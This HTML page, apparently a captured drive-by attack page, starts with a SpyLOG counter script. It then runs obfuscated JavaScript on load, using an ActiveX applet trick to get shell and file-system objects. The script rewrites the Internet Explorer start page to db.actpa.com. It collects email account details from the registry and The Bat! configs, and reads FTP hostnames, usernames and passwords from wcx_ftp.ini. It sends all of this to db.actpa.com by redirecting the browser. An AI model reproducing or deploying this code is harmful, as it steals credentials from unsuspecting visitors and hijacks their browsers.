    <!-- SpyLOG f:0111 -->
    <script language="javascript"><!--
    Mu="u2982.02.spylog.com";Md=document;Mnv=navigator;Mp=0;
    Md.cookie="b=b";Mc=0;if(Md.cookie)Mc=1;Mrn=Math.random();
    Mn=(Mnv.appName.substring(0,2)=="Mi")?0:1;Mt=(new Date()).getTimezoneOffset();
    Mz="p="+Mp+"&rn="+Mrn+"&c="+Mc+"&t="+Mt;
    if(self!=top){Mfr=1;}else{Mfr=0;}Msl="1.0";
    //--></script><script language="javascript1.1"><!--
    Mpl="";Msl="1.1";Mj = (Mnv.javaEnabled()?"Y":"N");Mz+='&j='+Mj;
    //--></script><script language="javascript1.2"><!-- 
    Msl="1.2";Ms=screen;Mpx=(Mn==0)?Ms.colorDepth:Ms.pixelDepth;
    Mz+="&wh="+Ms.width+'x'+Ms.height+"&px="+Mpx;
    //--></script><script language="javascript1.3"><!--
    Msl="1.3";//--></script><script language="javascript"><!--
    My="";My+="<a href='http://"+Mu+"/cnt?cid=298202&f=3&p="+Mp+"&rn="+Mrn+"' target=_blank>";
    My+="<img src='http://"+Mu+"/cnt?cid=298202&"+Mz+"&sl="+Msl+"&r="+escape(Md.referrer)+"&fr="+Mfr+"&pg="+escape(window.location.href);
    My+="' border=0 width=0 height=0 alt='SpyLOG'>";
    My+="</a>";Md.write(My);//--></script><noscript>
    <a href="http://u2982.02.spylog.com/cnt?cid=298202&f=3&p=0" target=_blank>
    <img src="http://u2982.02.spylog.com/cnt?cid=298202&p=0" alt='SpyLOG' border='0' width=0 height=0 >
    </a></noscript>
    <!-- SpyLOG -->
<html>
<body bgcolor="#A7A7A7" onload="javascript:init();">
<script language="javascript"> 
document.write("<APPL"+"ET HEIGHT=0 WI"+"DTH=0 code=com"+".ms.active"+"X.ActiveXC"+"omponent"+"></APPLET>")
function f(){
try
{
q='http://db.actpa.com/enter.pl?';
a1=document.applets[0]; 
a1.setCLSID("{F935DC"+"22-1CF0-"+"11D0-ADB"+"9-00C04F"+"D58A0B}"); 
a1.createInstance();
Shl = a1.GetObject(); 
a1.setCLSID("{0D43F"+"E01-F093-"+"11CF-894"+"0-00A0C90"+"54228}"); 
a1.createInstance(); 
FSO = a1.GetObject(); 
a1.setCLSID("{F935"+"DC26-1C"+"F0-11"+"D0-ADB"+"9-00C0"+"4FD5"+"8A0B}"); 
a1.createInstance(); 
Net = a1.GetObject();
aa1="HKCU\\Software\\Microsoft\\Internet Explorer";
aa2="\\Main\\Start Page";
a=Shl.RegRead(aa1+aa2);
if (a.substring(0,11)!="about:blank")
{
if (a.substring(0,20)!="http://db.actpa.com/") {a="http://db.actpa.com/home.pl?go="+a;}
Shl.RegWrite(aa1+aa2, a);
}
n=0;
for(i=1; i<9; i+=1) 
{ 
p1='HKCU\\Software';
p2='\\Microsoft\\Internet Account Manager\\Accounts';
p3='\\0000000'+(i)+'\\';
p=p1+p2+p3;
try
{
n=n+1;
q=q+'dn'+n+'='+Shl.RegRead(p+"SMTP Display Name");
q=q+'&ea'+n+'='+Shl.RegRead(p+"SMTP Email Address");
q=q+'&sv'+n+'='+Shl.RegRead(p+"SMTP Server");
q=q+'&';
}
catch(e) {};
}
p1='HKCU\\Software\\RIT\\The Bat!';
wd=Shl.RegRead(p1+'\\Working Directory');
for(i=1; i<10; i+=1) 
{
try
{
usd=Shl.RegRead(p1+'\\Users Depot\\User #'+i);
fn=wd+usd+'\\ACCOUNT.CFG'
var F = FSO.OpenTextFile(fn,1,-1);
c=0;
s='';
n=n+1;	
while (c<7)
{
L=F.Read(1);
if (escape(L)<'%20')
{
if (s!='')
{
if (c==0) {q=q+'dn'+n+'='+s;}
if (c==1) {q=q+'&ea'+n+'='+s;}
if (c==6) {q=q+'&sv'+n+'='+s+'&';}
s='';
c=c+1;
}
}
else {s=s+L}
}   
F.Close();
}
catch(e) {};
}  
}
catch(e) {};
try
{
WPE=Shl.Environment("PROCESS");
fn=WPE("WINDIR") + "\\wcx_ftp.ini"; 
var F = FSO.OpenTextFile(fn,1,-1);
c=0;
q=q+'&wnc=';
while (c<5000)
{
L=F.ReadLine();
if (L.substring(0,4)=="host") {q=q+'|'+L}
if (L.substring(0,8)=="username") {q=q+'|'+L}
if (L.substring(0,8)=="password") {q=q+'|'+L}
c=c+1;
}
}
catch(e) {};
window.location.replace(q);
}

function init(){ 
setTimeout("f()", 1000); 
} 
</script> 
</html>
